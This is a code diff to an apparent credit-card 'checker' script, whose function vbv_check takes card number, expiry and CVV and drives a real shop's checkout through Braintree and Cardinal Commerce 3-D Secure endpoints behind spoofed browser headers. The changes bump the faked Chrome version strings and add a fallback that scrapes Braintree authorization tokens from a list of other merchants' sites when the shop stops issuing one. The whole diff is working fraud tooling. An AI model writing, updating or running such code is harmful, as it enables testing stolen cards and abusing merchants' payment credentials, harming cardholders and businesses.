@@ -8,7 +8,7 @@ import json
 import jwt
 import string
 
-UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
 
 FIRST_NAMES = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "David", "Elizabeth"]
 LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
@@ -48,7 +48,7 @@ async def vbv_check(cc, mm, yy, cvv, proxy=None):
     base_headers = {
         'accept': '*/*',
         'accept-language': 'en-US,en;q=0.9',
-        'sec-ch-ua': '"Google Chrome";v="131", "Not=A?Brand";v="8", "Chromium";v="131"',
+        'sec-ch-ua': '"Google Chrome";v="138", "Not=A?Brand";v="8", "Chromium";v="138"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
         'sec-fetch-dest': 'empty',
@@ -173,21 +173,42 @@ async def vbv_check(cc, mm, yy, cvv, proxy=None):
             }
             step3_resp = await client.post('https://shop.acumedic.com/checkout', headers=checkout_headers, data=shipping_method_data)
 
+            au = ""
+
+            # 1. the shop's own checkout page
             token_match = re.search(r'client_token["\']?\s*(?:value=|[=:])\s*["\']([A-Za-z0-9+/=]+)', step3_resp.text)
             if not token_match:
                 token_match = re.search(r'name="client_token"\s+value="([^"]+)"', step3_resp.text)
-            if not token_match:
+            if token_match:
+                try:
+                    decoded_token = base64.b64decode(token_match.group(1)).decode('utf-8')
+                    auth_fp_match = re.findall(r'"authorizationFingerprint":"([^"]+)"', decoded_token)
+                    if auth_fp_match:
+                        au = auth_fp_match[0]
+                except Exception:
+                    au = ""
+
+            # 2. that shop no longer hands out a client token, so take the
+            #    Braintree token straight from a merchant page instead --
+            #    the same way the Braintree charge gate does it.
+            if not au:
+                try:
+                    from braintree_idt import _get_bt_auth, BRAINTREE_LEGACY_SITES
+                except Exception:
+                    BRAINTREE_LEGACY_SITES = []
+                for _site in BRAINTREE_LEGACY_SITES:
+                    try:
+                        _r = await client.get(_site["url"], timeout=20)
+                        _t = _get_bt_auth(client, _r.text, _site.get("url"))
+                        if _t and _t.startswith("production_"):
+                            au = _t
+                            break
+                    except Exception:
+                        continue
+
+            if not au:
                 elapsed = round(time.time() - start, 2)
                 return f"Error - Could not get Braintree token [{elapsed}s]"
-
-            client_token = token_match.group(1)
-            decoded_token = base64.b64decode(client_token).decode('utf-8')
-            auth_fp_match = re.findall(r'"authorizationFingerprint":"([^"]+)"', decoded_token)
-            if not auth_fp_match:
-                elapsed = round(time.time() - start, 2)
-                return f"Error - Could not get auth fingerprint [{elapsed}s]"
-
-            au = auth_fp_match[0]
 
             bt_headers = {
                 'accept': '*/*',
@@ -198,7 +219,7 @@ async def vbv_check(cc, mm, yy, cvv, proxy=None):
                 'origin': 'https://shop.acumedic.com',
                 'referer': 'https://shop.acumedic.com/checkout/4/',
                 'user-agent': UA,
-                'sec-ch-ua': '"Google Chrome";v="131", "Not=A?Brand";v="8", "Chromium";v="131"',
+                'sec-ch-ua': '"Google Chrome";v="138", "Not=A?Brand";v="8", "Chromium";v="138"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
                 'sec-fetch-dest': 'empty',
@@ -233,7 +254,7 @@ async def vbv_check(cc, mm, yy, cvv, proxy=None):
                 'referer': 'https://shop.acumedic.com/checkout/4/',
                 'user-agent': UA,
                 'x-cardinal-tid': tid,
-                'sec-ch-ua': '"Google Chrome";v="131", "Not=A?Brand";v="8", "Chromium";v="131"',
+                'sec-ch-ua': '"Google Chrome";v="138", "Not=A?Brand";v="8", "Chromium";v="138"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
                 'sec-fetch-dest': 'empty',
@@ -293,7 +314,7 @@ async def vbv_check(cc, mm, yy, cvv, proxy=None):
                 'referer': f'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5c8a9893adb1562e003c26a6&tmEventType=PAYMENT&referenceId={consumer_session}&geolocation=false&origin=Songbird',
                 'user-agent': UA,
                 'x-requested-with': 'XMLHttpRequest',
-                'sec-ch-ua': '"Google Chrome";v="131", "Not=A?Brand";v="8", "Chromium";v="131"',
+                'sec-ch-ua': '"Google Chrome";v="138", "Not=A?Brand";v="8", "Chromium";v="138"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
                 'sec-fetch-dest': 'empty',
@@ -380,7 +401,7 @@ async def vbv_check(cc, mm, yy, cvv, proxy=None):
                 'origin': 'https://assets.braintreegateway.com',
                 'referer': 'https://assets.braintreegateway.com/',
                 'user-agent': UA,
-                'sec-ch-ua': '"Google Chrome";v="131", "Not=A?Brand";v="8", "Chromium";v="131"',
+                'sec-ch-ua': '"Google Chrome";v="138", "Not=A?Brand";v="8", "Chromium";v="138"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
                 'sec-fetch-dest': 'empty',
@@ -435,7 +456,7 @@ async def vbv_check(cc, mm, yy, cvv, proxy=None):
                 'origin': 'https://shop.acumedic.com',
                 'referer': 'https://shop.acumedic.com/checkout/4/',
                 'user-agent': UA,
-                'sec-ch-ua': '"Google Chrome";v="131", "Not=A?Brand";v="8", "Chromium";v="131"',
+                'sec-ch-ua': '"Google Chrome";v="138", "Not=A?Brand";v="8", "Chromium";v="138"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
                 'sec-fetch-dest': 'empty',
@@ -551,4 +572,4 @@ async def vbv_check(cc, mm, yy, cvv, proxy=None):
         return f"Error - Gateway timeout [{elapsed}s]"
     except Exception as e:
         elapsed = round(time.time() - start, 2)
-        return f"Error - {str(e)[:120]} [{elapsed}s]"
+        return f"Error - {type(e).__name__}: {str(e)[:120]} [{elapsed}s]"
